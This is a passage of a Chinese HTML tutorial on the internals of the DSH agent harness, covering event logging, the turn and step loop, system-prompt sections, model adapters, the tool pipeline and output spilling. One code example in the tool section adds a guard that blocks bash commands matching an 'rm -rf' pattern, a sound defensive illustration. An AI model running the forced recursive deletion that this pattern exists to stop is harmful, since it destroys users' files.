+<ul><li><strong><code>seq</code> 是全局单调递增的序号</strong>。所有引用（比如压缩要替换哪一段、这条结果属于哪次调用）都用 <code>seq</code> 定位，不用数组下标。</li><li><strong><code>tool/call</code> 的 <code>arguments</code> 是一个 JSON 字符串</strong>，不是对象。因为它是模型的原始输出，保留原文才可回放、可审计。</li><li><strong>每条事件都带 <code>time</code></strong>。这让“这个任务卡了多久”这种问题能被回答。</li><li><strong><code>request/header</code> 单独记一条</strong>。因为它可能很大（几十个工具的 JSON Schema），而变化不频繁<span class="dash">——</span>把它独立成事件，后续请求只需引用它，日志不至于翻倍。</li></ul>
+<h3>8.1 64 种事件，分五类</h3>
+<p>事件类型不是随便命名的，看一眼就知道系统认为“什么算事实”。我把 64 种归了类：</p>
+<figure class="table-wrap"><table><thead><tr><th>类别</th><th>代表事件</th><th>说明</th></tr></thead><tbody><tr><td>生命周期</td><td><code>turn/start</code> <code>step/start</code> <code>session/end-seed</code></td><td>边界，用来算耗时和状态</td></tr><tr><td>模型可见内容</td><td><code>system/message</code> <code>user/message</code> <code>assistant/message</code> <code>tool/result</code> <code>developer/message</code></td><td><strong>只有这些会进模型上下文</strong></td></tr><tr><td>调用证据</td><td><code>request/header</code> <code>request/context</code> <code>assistant/attempt</code></td><td>证明“发出去的是什么”，含失败与重试</td></tr><tr><td>工具与副作用</td><td><code>tool/call</code> <code>approval/asked</code> <code>fs/observed</code> <code>todo/write</code></td><td>发生了什么事</td></tr><tr><td>系统决策</td><td><code>compaction/*</code> <code>model/selection</code> <code>sandbox/mode</code> <code>permission/preset</code></td><td>为什么这么做</td></tr></tbody></table></figure>
+<h3>8.2 一条铁律：模型可见 ⟺ 已记录</h3>
+<p><code>AGENTS.md</code> 里有一条工程纪律，原文是 “Model-visible ⟺ logged”：</p>
+<div class="highlight-card highlight-swiss"><div class="hl-label">核心纪律</div><div class="hl-body"><p>凡是会进入模型请求的内容，都必须能从会话日志重建。想加一个新的模型可见输入？先加一种会话事件。</p></div></div>
+<p>这条纪律的威力在于它把“可解释性”变成了结构约束，而不是事后补的日志。任何一次对话，你都能精确回答“当时模型到底看到了什么”<span class="dash">——</span>不是“大概看到了什么”。</p>
+<p>它还有一个直接好处：<strong>回放</strong>。DSH 的测试里有一类叫 snapshot test，就是把录好的真实会话日志重放一遍，看输出是否一致。不用花 API 费用，也能回归测试整个循环。</p>
+<h3>8.3 从日志到上下文：<code>deriveMessages()</code></h3>
+<p>模型需要的是一个 <code>messages</code> 数组，日志里存的是事件流。中间这步转换叫 <code>deriveMessages()</code><span class="dash">——</span>把事件投影成消息。</p>
+<p>这一步不能简单“全转”。因为：</p>
+<ol><li>有些事件只用于记账（<code>turn/start</code> 不是消息）；</li><li>有些消息<strong>被后来的事件遮蔽了</strong>（压缩之后旧内容不该再被看见）；</li><li>有些消息要<strong>改写</strong>（图片被卸载成占位文本）。</li></ol>
+<p>所以投影的时候会维护一个叫 <strong>surface（表面）</strong> 的东西：它记录“当前这一刻，哪些事件构成的序列才是模型该看到的”。压缩不删事件，而是往 surface 上写一条 <code>replace</code>（把 <code>seq 100 到 seq 400</code> 换成一条摘要）<span class="dash">——</span>日志永远完整，但模型只看见替换后的版本。</p>
+<p>投影在代码里就是两件事：<strong>写事件</strong>和<strong>读消息</strong>。</p>
+<pre><code class="language-ts">// 写：每个模型可见事实都是一条事件，附带 surface 操作
+session.append('user/message', { role: 'user', content: [{ type: 'text', text: '你好' }] },
+               { surfaceOp: 'append' })
+session.append('tool/result', { /* ... */ }, { surfaceOp: 'append' })
+
+// 读：日志 → 模型能吃的 messages（增量、有缓存）
+const messages = session.deriveMessages()</code></pre>
+<p>注意 <code>surfaceOp</code> 是<strong>必填</strong>的：连“追加”都要显式声明，因为将来它可能被换成 <code>replace</code>。这个强制约束就是压缩能安全接管历史的前提。</p>
+<p>记住这个机制，第 14 章讲压缩时会回来。</p></section><section class="section" id="s-11"><div class="section-header"><div class="section-number">11</div><h2>9 · 轮次与步骤：循环的状态机</h2></div><details class="pm-card"><summary class="pm-sum"><span class="pm-tag">产品经理视角</span><span class="pm-lead">可度量</span><span class="pm-plus" aria-hidden="true">＋</span></summary><div class="pm-body"><div class="pm-row"><span class="pm-k">谁的痛</span><div class="pm-v">用户问「这一轮花了多少、什么时候算完」，没人答得上</div></div><div class="pm-row"><span class="pm-k">怎么解</span><div class="pm-v">turn / step 两级状态，加显式的开始与结束事件</div></div><div class="pm-row"><span class="pm-k">代价</span><div class="pm-v">状态机复杂，取消、失败、恢复的边界多</div></div><div class="pm-row"><span class="pm-k">可迁移</span><div class="pm-v">任何长任务系统都要有可观测的边界事件，否则无法计量与中断</div></div></div></details><p>现在把第 7 章的第 3 到第 5 步拆开看。DSH 的循环（<code>dsh-agent-loop</code>）用一套明确的状态机驱动，不是 <code>while(true)</code> 一把梭。</p>
+<pre><code class="language-text">turn/start
+  ├─ 领取输入（一条用户消息 + 可能夹带的中途注入）
+  ├─ 组装：系统提示词 + 这一步允许用的工具
+  ├─ agent/pre-step  ← 拦截点：可以拒绝、可以改写消息
+  ├─ step/start
+  │    ├─ agent/request   ← 拦截点：可以调参数（已弃用但保留）
+  │    ├─ 准备调用 prepareCall()（绑定适配器、算默认值）
+  │    ├─ 提交系统提示词 + 用户消息到日志
+  │    ├─ 记录 request/header
+  │    ├─ 冻结请求 → 流式调用模型
+  │    │    ├─ assistant/message（成功）
+  │    │    └─ assistant/attempt（失败/重试/取消）
+  │    ├─ tool/call → tools/pre-execute → tools/execute → tools/post-execute → tool/result
+  │    └─ step/end
+  ├─ 还有工具要跑？或又来了新输入？→ 回到 step/start
+  ├─ agent/turn-stopping  ← 拦截点：临门一脚还能把它拉回来
+turn/end</code></pre>
+<h3>9.1 为什么要有“请求头（header）”这种奇怪的东西</h3>
+<p><code>request/header</code> 记录的不是消息，而是“这次请求的信封”：用哪个 provider、哪个模型、推理强度多少、给了哪些工具。</p>
+<p>为什么要单独记？三个原因，每个都很实际：</p>
+<ol><li><strong>省日志空间</strong>：工具 schema 可能有几万 token，每个 step 都重存一遍会把日志撑爆。所以只在“信封变了”的时候记一条，其他请求引用最近一条。</li><li><strong>可复现</strong>：两年后你还能知道“这次回答是用哪个模型、什么参数生成的”。</li><li><strong>缓存友好</strong>：信封不变，提供方的前缀缓存就还能用；信封一变，缓存必然失效。记录信封的变化点，等于记录了“缓存什么时候被清掉”。</li></ol>
+<h3>9.2 三个容易被忽略的健壮性设计</h3>
+<p>这部分是“demo”和“产品”的分界线，值得单独讲。</p>
+<p><strong>（1）请求是不可变的。</strong> 组装好的请求会被深度冻结，再交给适配器。适配器不能偷偷改它。为什么？因为如果适配器能改，那“模型看到的”和“日志记的”就可能不一致<span class="dash">——</span>违反 8.2 的铁律。</p>
+<p><strong>（2）取消不等于丢弃。</strong> 用户点“停止”时，已经流式输出给用户的字<strong>必须保留在历史里</strong>。否则下一轮模型会以为自己没说过那些话，对话就断了。DSH 的做法是：取消时记一条带 <code>interrupted: true</code> 的 assistant 消息，内容是“已经送达用户的那部分”。</p>
+<p><strong>（3）失败的步骤要补结果。</strong> 假设模型要调 5 个工具，第 3 个执行到一半进程挂了。下一次请求时，历史里就有 5 个 <code>tool/call</code> 但只有 2 个 <code>tool/result</code>。大多数模型 API 会直接报错（工具调用必须有配对结果）。DSH 的处理是：<strong>关步骤之前，给每个没有结果的调用补一条错误结果</strong>，并区分两种情况：</p>
+<ul><li>有 <code>tool/call</code> 记录但没有结果 → <code>TOOL_OUTCOME_UNKNOWN</code>（“可能已经执行了，副作用不明”）</li><li>连 <code>tool/call</code> 都没有 → <code>TOOL_NOT_STARTED</code>（“根本没开始”）</li></ul>
+<p>补账的伪代码大致是这样（概念示意）：</p>
+<pre><code class="language-text">for call in 本步骤的每个 tool/call:
+    if 已经有 tool/result: continue          # 已提交的结果保持完整
+    if 已经派发过:
+        append('tool/result', error='TOOL_OUTCOME_UNKNOWN',
+               text='它可能已经执行，副作用未知。')
+    else:
+        append('tool/result', error='TOOL_NOT_STARTED',
+               text='还没开始就被中断，可以安全重试。')</code></pre>
+<p>这样做的好处：下一次请求的工具历史永远是<strong>配对完整</strong>的，模型不需要猜“我那个工具到底跑没跑”。</p>
+<p>第二种可以放心重试，第一种不行<span class="dash">——</span>因为可能已经改了文件/发了请求。<strong>「区分没做和不知道做没做」，是可靠系统的基本功。</strong> 这个细节在真实产品里极其重要，但在教程里几乎没人讲。</p>
+<h3>9.3 怎么跟一个正在跑的 agent 说话</h3>
+<p><code>dsh-agent</code> 提供了四个动作，命名很讲究，值得记住：</p>
+<figure class="table-wrap"><table><thead><tr><th>动作</th><th>语义</th><th>何时生效</th></tr></thead><tbody><tr><td><code>followup()</code></td><td>排一条新消息，唤醒循环</td><td>当前轮次结束后开新轮次</td></tr><tr><td><code>steer()</code></td><td>中途引导：“顺便也看看测试”</td><td>下一个 step 就带上</td></tr><tr><td><code>inject()</code></td><td>只塞上下文，<strong>不唤醒</strong></td><td>下一次有请求时带上</td></tr><tr><td><code>cancel()</code></td><td>中止当前活动</td><td>立刻</td></tr></tbody></table></figure>
+<p><code>steer</code> 和 <code>inject</code> 的区别是这块设计的精髓：<strong>“我要你现在就改方向”和“这是背景信息，你需要时自然会看到”是两件事</strong>。前者要唤醒，后者不该唤醒<span class="dash">——</span>否则你每注入一条参考信息，模型就无谓地多跑一轮。</p></section><section class="section" id="s-12"><div class="section-header"><div class="section-number">12</div><h2>10 · 系统提示词：给模型看的“岗位说明书”</h2></div><details class="pm-card"><summary class="pm-sum"><span class="pm-tag">产品经理视角</span><span class="pm-lead">可维护</span><span class="pm-plus" aria-hidden="true">＋</span></summary><div class="pm-body"><div class="pm-row"><span class="pm-k">谁的痛</span><div class="pm-v">提示词散落在几十个文件，改一处崩三处</div></div><div class="pm-row"><span class="pm-k">怎么解</span><div class="pm-v">集中排序表 + 同名遮蔽 + 段与运行时上下文分离</div></div><div class="pm-row"><span class="pm-k">代价</span><div class="pm-v">注册顺序成了隐式契约，新人容易踩</div></div><div class="pm-row"><span class="pm-k">可迁移</span><div class="pm-v">「配置集中、内容分散」是提示词工程唯一可持续的形态</div></div></div></details><p>大部分人以为系统提示词就是一段手写文字。在真实产品里，它是一份<strong>动态拼装的文档</strong>，由十几个模块各自贡献一段，按数值顺序拼起来。</p>
+<p>DSH 把这件事做到了很干净：所有段的顺序集中在一张表里（<code>packages/core/system-prompt/src/index.ts</code> 的 <code>SECTION_ORDERS</code>），谁想加一段就来注册，不允许自己决定插在哪。真实表长这样：</p>
+<figure class="table-wrap"><table><thead><tr><th>order</th><th>段名</th><th>谁贡献的</th><th>内容大意</th></tr></thead><tbody><tr><td>−1000</td><td><code>harness:identity</code></td><td>系统提示词服务</td><td>“你是由 DeepSeek Harness 驱动的 AI agent”</td></tr><tr><td>0</td><td><code>deployment:persona-prefix</code></td><td>部署配置</td><td>“你是一个编码 agent，由 {{model}} 模型驱动”</td></tr><tr><td>500</td><td><code>plan:policy</code></td><td>plan-mode 插件</td><td>计划模式的规矩</td></tr><tr><td>600</td><td><code>team:policy</code></td><td>agent-team</td><td>团队协作的规矩</td></tr><tr><td>900</td><td><code>context:file-reference</code></td><td>文件引用</td><td>用户 @ 了哪些文件</td></tr><tr><td>1000–1700</td><td><code>tool:bash</code> <code>tool:read</code> <code>tool:edit</code> …</td><td>各工具包</td><td>每个工具的使用说明</td></tr><tr><td>2000–2900</td><td><code>tool:web_search</code> <code>tool:subagent</code> …</td><td>各工具包</td><td>同上，重一点的工具排在后面</td></tr><tr><td>3100</td><td><code>mcp:<server></code></td><td>MCP 客户端</td><td>外部服务自己给的说明</td></tr><tr><td>5000</td><td><code>tools:sdk</code></td><td>PTC 执行器</td><td>代码工具模式的说明</td></tr><tr><td>9900</td><td><code>tool:<structured_output></code></td><td>子 agent</td><td>要求按 JSON 结构返回</td></tr><tr><td>10000</td><td>源码路径 / Web 入口</td><td>开发上下文</td><td>你现在跑的这份源码在哪</td></tr><tr><td>10200</td><td><code>deployment:persona-suffix</code></td><td>部署配置</td><td>收尾的补充要求</td></tr></tbody></table></figure>
+<p>几个设计要点值得学：</p>
+<p><strong>（1）顺序是有讲究的。</strong> 固定的身份在最前（−1000），部署定制的语气在 0，工具说明居中（1000–5000），“环境事实”（源码路径、Web 入口）放最后（10000+）。原因是<strong>稳定在前、易变在后</strong><span class="dash">——</span>这样前缀缓存命中率最高（见第 1 章铁律三）。</p>
+<p><strong>（2）同名可遮蔽（shadowing）。</strong> 一个 agent preset 想换掉部署级的 persona？注册一个同名的 <code>deployment:persona-prefix</code> 就行，最具体的赢。这让“给某个会话换个性格”变成一行配置。</p>
+<p><strong>（3）工具说明也是提示词的一部分。</strong> 每个工具注册时顺带贡献一段“什么时候该用它”的文字。这就是为什么工具的 <code>description</code> 写得好不好，直接决定模型用得对不对<span class="dash">——</span><strong>工具描述不是文档，是 prompt</strong>。</p>
+<p>加一段提示词就是一次注册，顺序用数字说话：</p>
+<pre><code class="language-ts">// 一个工具包贡献自己那段说明；1000 决定它排在哪
+ctx.systemPrompt.section({
+  name: 'tool:bash',
+  order: 1000,
+  text: 'Prefer bash for file and process operations.',
+})
+
+// 想按 agent 定制？用 agent.ctx 注册同名段即可「遮蔽」全局的
+agent.ctx.systemPrompt.section({ name: 'tool:bash', order: 1000, text: '本会话禁用 bash。' })</code></pre>
+<p>这就是为什么系统提示词不需要一个“总编辑”：<strong>每个模块只管自己那一段，位置由集中分配的数字决定。</strong></p>
+<h3>10.1 段（section）vs 运行时上下文（context）</h3>
+<p>这是 DSH 一个非常聪明的区分，也是我建议你在自己项目里照抄的设计：</p>
+<figure class="table-wrap"><table><thead><tr><th></th><th>段（section）</th><th>运行时上下文（context）</th></tr></thead><tbody><tr><td>内容</td><td>稳定的指令、工具说明、身份</td><td>每步都会变的事实：当前目录、沙箱模式、审批策略</td></tr><tr><td>变化频率</td><td>低</td><td>每步都刷新</td></tr><tr><td>放在哪</td><td>系统提示词（surface 第 0 号节点）</td><td>一条 user 角色的快照消息</td></tr><tr><td>缓存影响</td><td>变化会导致前缀缓存失效</td><td>天然在末尾，不影响前缀</td></tr></tbody></table></figure>
+<p>真实注入的消息长这样（第一行是固定的，后面几条的措辞由各自的贡献方决定，随部署组合而变）：</p>
+<pre><code class="language-text">Current runtime context. This snapshot supersedes earlier runtime-context snapshots.
+Current working directory: &quot;/home/sakura/my_work/dsh_learn&quot;.
+Current DSH file policy: workspace-write. ...
+（sandbox 策略、审批策略、子 agent 深度等由各自插件追加）</code></pre>
+<p><strong>为什么不能把这些塞进系统提示词？</strong> 因为 cwd 一变，整个系统提示词就变了，缓存全废；而且模型会被反复告知“你现在在 X”，浪费 token。放在末尾的 user 消息里，改了就改了，前面几万 token 的缓存照样命中。</p>
+<p>顺带一个反直觉的事实：<strong>git 状态不会自动进上下文</strong>。DSH 没有任何内置的 git 状态注入，模型想知道分支就得自己跑 <code>bash git status</code>。这是一个刻意的取舍<span class="dash">——</span>自动注入会带来“每步刷新”和“污染缓存”的代价，却只在一个场景下有用。</p>
+<h3>10.2 一个关键决定：系统提示词不走 <code>system</code> 字段</h3>
+<p>大多数框架把系统提示词放在请求的 <code>system</code> 字段里。DSH 不这么做：<strong>它把系统提示词当成会话历史里的第 0 号消息</strong>（一条 <code>system/message</code> 事件），请求体里没有 <code>system</code> 字段。</p>
+<p>为什么？三个好处：</p>
+<ol><li><strong>可回放</strong>：系统提示词也是“模型看到的东西”，按铁律它必须能从日志重建。走事件最自然。</li><li><strong>可替换</strong>：压缩想遮蔽旧的提示词？在 surface 上替换那条事件就行。如果它在 <code>system</code> 字段里，压缩没法碰它。</li><li><strong>可演进</strong>：改提示词就是追加或替换一条消息，不需要给每种 API 都设计一套“怎么更新 system”的规则。</li></ol>
+<p>代价是：要处理“不同模型对 system 消息的位置容忍度不同”<span class="dash">——</span>有的模型认最后一条，有的只认第一条。所以 DSH 的适配器要声明一个能力 <code>systemPromptUpdate: 'in-history' | 无</code>，循环据此决定是“原地替换”还是“归并到头部”。<strong>这就是“适配器声明能力、循环按能力分支”的典型写法</strong>：不是到处 if 判断供应商，而是让适配器自己说“我能怎么更新”。</p></section><section class="section" id="s-13"><div class="section-header"><div class="section-number">13</div><h2>11 · 模型调用层：一个“能力缝”的完整例子</h2></div><details class="pm-card"><summary class="pm-sum"><span class="pm-tag">产品经理视角</span><span class="pm-lead">外部依赖</span><span class="pm-plus" aria-hidden="true">＋</span></summary><div class="pm-body"><div class="pm-row"><span class="pm-k">谁的痛</span><div class="pm-v">换供应商就要重写一遍调用代码</div></div><div class="pm-row"><span class="pm-k">怎么解</span><div class="pm-v">能力缝三角色，换 provider 不改 consumer</div></div><div class="pm-row"><span class="pm-k">代价</span><div class="pm-v">适配层要做翻译、归一化、能力声明，工作量大</div></div><div class="pm-row"><span class="pm-k">可迁移</span><div class="pm-v">凡外部依赖都该有一层薄适配；薄是关键，厚了就变成新框架</div></div></div></details><p>DSH 里最重要的架构模式叫 <strong>capability seam（能力缝）</strong>，三个角色缺一不可：</p>
+<figure class="table-wrap"><table><thead><tr><th>角色</th><th>职责</th><th>例子</th></tr></thead><tbody><tr><td>Service Definition</td><td>声明接口，占据一个 <code>ctx</code> 名字</td><td><code>dsh-llm</code> 提供 <code>ctx.llm</code></td></tr><tr><td>Service Provider</td><td>实现它</td><td><code>dsh-llm-deepseek</code>（官方 API）、<code>dsh-llm-pi-ai</code>（兼容网关）</td></tr><tr><td>Consumer</td><td>使用它</td><td>agent 循环、会话标题生成、压缩摘要器</td></tr></tbody></table></figure>
+<p>缝（seam）的意义：<strong>换一个 provider，整个产品的行为跟着变，但消费方的代码一行不改。</strong> 你可以在配置里同时挂两个适配器，按名字路由到不同的模型。</p>
+<h3>11.1 一次调用在 wire 上发生什么</h3>
+<p>适配器内部要做的事比想象的多。以 DeepSeek 适配器为例，它的源码目录里有这些文件：</p>
+<pre><code class="language-text">adapter.ts      适配器实现（注册路由、能力声明）
+serialize.ts    把内部消息结构翻译成提供方的 JSON
+translate.ts    把提供方的响应翻回内部结构
+sse.ts          解析 Server-Sent Events（流式片段）
+transport.ts    发请求、超时、重试
+model-info.ts   这个模型的上下文窗口、推理强度、价格
+files-api.ts    文件上传（有文件 API 的供应商）</code></pre>
+<p>必须做的事：把内部 <code>Message[]</code> 翻译成提供方格式（每家都不一样）、把工具 schema 翻译过去、解析流、把“用量/结束原因/错误”归一化回内部词汇。<strong>这部分代码通常没人愿意写第二遍</strong>，这正是一个 harness 该帮你收掉的工作。</p>
+<p>消费方看到的接口只有“一个流”：</p>
+<pre><code class="language-ts">for await (const chunk of ctx.llm.stream({
+  provider: 'deepseek-official',
+  model: 'deepseek-flash',
+  messages,
+})) {
+  if (chunk.type === 'text-delta') process.stdout.write(chunk.text)   // 边收边显示
+  if (chunk.type === 'finish') break                                  // 流一定以终态结束
+}</code></pre>
+<p>循环、压缩器、会话标题生成器用的都是这同一个入口<span class="dash">——</span><strong>这就是“缝”的价值：调用方永远只见一套词汇。</strong></p>
+<h3>11.2 <code>prepareCall()</code>：为什么要“准备”两次</h3>
+<p>调用模型前有两步，看起来多余，其实是必要分离：</p>
+<ol><li><strong>组装（assemble）</strong>：拼系统提示词、算可用工具。</li><li><strong>准备（prepareCall）</strong>：绑定适配器、把默认值落定（推理强度、输出上限）、算这个模型的能力（上下文窗口多大、能不能看图）、返回一份<strong>冻结的调用配置</strong>。</li></ol>
+<p>为什么分开？因为组装的结果要能拿去估算压力（决定要不要压缩），而准备的结果要写进日志（请求头）。而且<strong>准备阶段要拿模型的元数据</strong><span class="dash">——</span>比如“这个模型支持哪些推理强度”，只有适配器知道。所以准备是把“抽象的请求”变成“具体的、可执行、可记录的那一次调用”。</p>
+<p>一个工程细节：<strong>准备和记录请求头之间，拿的是同一个适配器代次</strong>。防止你准备完，适配器被热替换了，结果发出去的和记录的对不上。</p></section><section class="section" id="s-14"><div class="section-header"><div class="section-number">14</div><h2>12 · 工具：agent 的双手</h2></div><details class="pm-card"><summary class="pm-sum"><span class="pm-tag">产品经理视角</span><span class="pm-lead">能力面</span><span class="pm-plus" aria-hidden="true">＋</span></summary><div class="pm-body"><div class="pm-row"><span class="pm-k">谁的痛</span><div class="pm-v">模型能不能干活，取决于你给了什么工具、怎么描述</div></div><div class="pm-row"><span class="pm-k">怎么解</span><div class="pm-v">定义即提示词、五段流水线、并发分级、结果两种呈现</div></div><div class="pm-row"><span class="pm-k">代价</span><div class="pm-v">每个工具都要额外设计失败、幂等、有界输出</div></div><div class="pm-row"><span class="pm-k">可迁移</span><div class="pm-v">工具的产品设计 = API 设计 + 文案设计，两者缺一不可</div></div></div></details><p>工具是 agent 唯一能改变世界的地方。所以工具的设计，直接决定这个 agent 能干什么、会不会搞破坏。</p>
+<h3>12.1 一个工具的定义长什么样</h3>
+<p>DSH 用 <code>defineTool()</code> 声明工具，比裸写 JSON Schema 舒服很多：</p>
+<pre><code class="language-ts">ctx.tools.register(defineTool({
+  name: 'read_file',
+  description: 'Read a file from disk.',
+  parameters: {
+    path: { type: 'string', required: true, description: 'Absolute file path' },
+    offset: { type: 'number' },
+    limit: { type: 'number' },
+  },
+  output: {
+    schema: { type: 'string' },
+    render: (_args, value) =&gt; [{ type: 'text', text: value }],
+  },
+  async execute(args, exec) {
+    return readFile(args.path, { encoding: 'utf8', signal: exec.signal })
+  },
+}))</code></pre>
+<p>注意几个设计：</p>
+<ul><li><strong><code>parameters</code> 用一套简化 DSL，自动推出 TypeScript 类型</strong>：<code>execute(args)</code> 里的 <code>args</code> 是有类型的，写错字段名编译就报错。</li><li><strong>执行前会校验模型给的参数</strong>：模型幻觉出一个不存在的参数，会被挡在门外，变成一条普通的错误结果<span class="dash">——</span><strong>不会让整个轮次崩掉</strong>。</li><li><strong><code>output</code> 声明输出结构</strong>：这样程序化调用方（另一个 agent、工作流）能拿到结构化的值，而不是一段文本再去正则解析。</li><li><strong><code>exec.signal</code></strong>：每个工具都能被取消，因为用户随时可能按停止。</li></ul>
+<h3>12.2 工具有“两种呈现”，但只有一种真相</h3>
+<p>工具的返回值会经过两层处理：</p>
+<ol><li><strong>规范值（canonical value）</strong>：程序可读的结构化数据，给别的程序用。</li><li><strong>渲染内容（projected content）</strong>：给模型看的文字/图片，写进会话日志。</li></ol>
+<p>为什么要分开？因为<strong>给模型看的和给程序看的不该是同一份</strong>。模型需要一句人话摘要，程序需要精确字段。混在一起，就会写出“给模型看 JSON、然后祈祷它别解析错”的代码。</p>
+<h3>12.3 执行流水线：五道关卡</h3>
+<p>一个工具调用从“模型说要用”到“结果写进日志”，要过五道关。这是全篇最值得抄的一张图：</p>
+<div class="process"><div class="process-step"><div class="process-num">01</div><div class="process-content"><div class="process-title">tools/pre-execute</div><div class="process-desc">允许 / 拒绝 / 询问；审批只批这一次</div></div></div><div class="process-step"><div class="process-num">02</div><div class="process-content"><div class="process-title">单调守卫</div><div class="process-desc">只拦不放，后面的监听器翻不了案</div></div></div><div class="process-step"><div class="process-num">03</div><div class="process-content"><div class="process-title">tools/execute</div><div class="process-desc">环绕式包装：超时、重试、埋点</div></div></div><div class="process-step"><div class="process-num">04</div><div class="process-content"><div class="process-title">tools/post-execute</div><div class="process-desc">检查、替换、附加上下文</div></div></div><div class="process-step"><div class="process-num">05</div><div class="process-content"><div class="process-title">finalizeContent</div><div class="process-desc">最后的内容不变式，然后写成 tool/result</div></div></div></div>
+<p><strong>第 1 道和第 2 道的分工特别精妙。</strong> 前者是“可以商量的”（多个监听器可以包装、改写决定，<code>prepend</code> 可以插队）；后者是“不可翻案的”（守卫只能返回拒绝理由或弃权，没有“允许”这个返回值）。所以：</p>
+<ul><li>想加一个“危险命令要问人”的策略 → 挂第 1 道</li><li>想加一个“不许在没读过文件的情况下改它”的不变式 → 注册守卫</li></ul>
+<p>这个区分解决了一个真实痛点：<strong>当多个插件都挂权限监听器时，谁都可能把别人的拒绝改成允许。</strong> 一旦是“安全不变式”，就必须是不可覆盖的。</p>
+<p>想加一条“危险命令要问人”，不用改循环，挂一个监听器就行：</p>
+<pre><code class="language-ts">ctx.on('tools/pre-execute', (exec, next) =&gt; {
+  if (exec.name === 'bash') {
+    const { command } = exec.arguments as { command: string }
+    if (/\brm\s+-rf\b/.test(command)) return '拒绝：请先确认删除范围'   // 返回理由 = 拒绝
+  }
+  return next()                                                          // 不返回就放行给下游
+}, { prepend: true })</code></pre>
+<p>一个函数，就完成了“策略”和“执行”的解耦。这就是第 5 章那个 waterfall 的实战价值。</p>
+<h3>12.4 并发：为什么结果必须按模型给的顺序</h3>
+<p>模型一次可能要调 10 个工具。直接 <code>Promise.all</code> 会出两个问题：</p>
+<ol><li><strong>有副作用的操作不能并发</strong>（两个 <code>git commit</code> 同时跑试试）。</li><li><strong>结果顺序会乱</strong>，模型会困惑（它按自己给的顺序理解结果）。</li></ol>
+<p>DSH 的做法：把调用分类成“必须独占的”和“可以并行的”，独占的做<strong>屏障</strong>（前后不能有别人跑），并行的放进<strong>有界滚动池</strong>（默认上限 10，可配）。但无论谁先跑完，<strong>写进历史的结果永远按模型给的顺序排</strong>。</p>
+<p>还有一层：<strong>执行前会重新分类一次</strong>。因为排队期间世界可能变了（工具被卸载、条件工具的条件现在不成立）。这种“排队时的事实，执行时再确认一遍”的习惯，在并发系统里非常常见，也非常容易忘。</p>
+<h3>12.5 工具设计的五条经验（可迁移）</h3>
+<div class="process"><div class="process-step"><div class="process-num">01</div><div class="process-content"><div class="process-title">描述即提示词</div><div class="process-desc">写清何时用、何时别用，比参数说明重要</div></div></div><div class="process-step"><div class="process-num">02</div><div class="process-content"><div class="process-title">幂等优先</div><div class="process-desc">能被安全重试的工具价值最高</div></div></div><div class="process-step"><div class="process-num">03</div><div class="process-content"><div class="process-title">有界输出</div><div class="process-desc">自带截断与预览，不指望下游兜底</div></div></div><div class="process-step"><div class="process-num">04</div><div class="process-content"><div class="process-title">失败要可读</div><div class="process-desc">错误信息是写给模型看的，要能自我修复</div></div></div><div class="process-step"><div class="process-num">05</div><div class="process-content"><div class="process-title">一个工具一件事</div><div class="process-desc">参数超过 8 个就该拆</div></div></div></div></section><section class="section" id="s-15"><div class="section-header"><div class="section-number">15</div><h2>13 · 结果回灌：上下文是这样被撑爆的</h2></div><details class="pm-card"><summary class="pm-sum"><span class="pm-tag">产品经理视角</span><span class="pm-lead">上下文经济</span><span class="pm-plus" aria-hidden="true">＋</span></summary><div class="pm-body"><div class="pm-row"><span class="pm-k">谁的痛</span><div class="pm-v">一次工具输出就撑爆窗口，会话直接废掉</div></div><div class="pm-row"><span class="pm-k">怎么解</span><div class="pm-v">分层漏斗：工具上限 → spill 有界预览 → compaction 兜底</div></div><div class="pm-row"><span class="pm-k">代价</span><div class="pm-v">预览可能丢关键信息，模型要多跑一轮去读</div></div><div class="pm-row"><span class="pm-k">可迁移</span><div class="pm-v">「有界但可追溯」永远优于「完整但爆炸」和「截断且丢失」</div></div></div></details><p>工具跑完，结果要回到模型眼前。这一步看着简单，其实是整个系统里最容易出事的地方。</p>
+<p><strong>一次 <code>bash ls</code> 可能返回 5 万行。</strong> 一次抓网页可能 10 万字符。一次跑测试的输出可能是几十万 token。直接塞进上下文，下一轮直接超窗，整个会话报废。</p>
+<p>DSH 的处理是多层漏斗：</p>
+<pre><code class="language-text">工具原始输出（可能 10 万 token）
+   ↓ ① 工具自己的输出上限（maxOutputChars，截断尾部）
+   ↓ ② spill 策略：超过 maxInlineTokens（示例配置 12500）
+   ↓        就换成「预览 + 定位信息」，完整内容落到磁盘
+   ↓ ③ 后续 compaction 再回头对历史做剪枝
+模型的上下文（有界）</code></pre>
+<p>两层概念要分清：</p>
+<ul><li><strong>spill（溢出存储）</strong>：<strong>同步、立即</strong>。一次工具调用发现结果太大，当场替换成“预览 + 一句「完整内容在 /path/xxx」”。模型如果需要全文，可以自己再调工具去读。</li><li><strong>compaction（压缩）</strong>：<strong>异步、滞后</strong>。等到上下文压力上来了，才回头处理历史。</li></ul>
+<p>模型看到的东西，前后差别是这样的：</p>
+<pre><code class="language-text"># 替换前：一次跑测试的输出，约 12 万 token（下一轮直接超窗）
+$ npm test
+... 8712 行测试日志 ...
+
+# 替换后：约 400 token，有界但可追溯
+$ npm test
+[前 40 行 ...]
+[... 省略 8,712 行 ...]
+[末尾 20 行 ...]
+完整输出已保存：~/.dsh/spill/2026-11-10/call_00_ET_85o.txt（可用 read 分段读取）</code></pre>
+<p><strong>为什么要给模型保留“定位信息”？</strong> 因为信息不该被静默丢弃。模型知道“有更多内容在那里”，就能做出选择：去读，还是不看。<strong>“有界但可追溯”，比“完整但爆炸”和“截断且丢失”都好。</strong></p>
+<p>另一个细节：工具结果写进日志的是 <code>tool/result</code> 事件，里面包的是一条 <code>role: "tool"</code> 的消息，带 <code>toolCallId</code> 指回那次调用。配对关系是强制的<span class="dash">——</span>API 层会拒绝没有配对结果的工具调用。所以第 9.2 节说的“失败要补结果”不是锦上添花，是<strong>不补就发不出去</strong>。</p></section><section class="section" id="s-16"><div class="section-header"><div class="section-number">16</div><h2>14 · 上下文管理：压缩不是“删除”，是“换书”</h2></div><details class="pm-card"><summary class="pm-sum"><span class="pm-tag">产品经理视角</span><span class="pm-lead">长任务寿命</span><span class="pm-plus" aria-hidden="true">＋</span></summary><div class="pm-body"><div class="pm-row"><span class="pm-k">谁的痛</span><div class="pm-v">长任务必然撞窗口，谁先撞谁先死</div></div><div class="pm-row"><span class="pm-k">怎么解</span><div class="pm-v">剪枝优先于摘要、摘要复用缓存、失败不杀轮次</div></div><div class="pm-row"><span class="pm-k">代价</span><div class="pm-v">摘要是有损压缩，模板再严也会丢细节，还要额外花钱</div></div><div class="pm-row"><span class="pm-k">可迁移</span><div 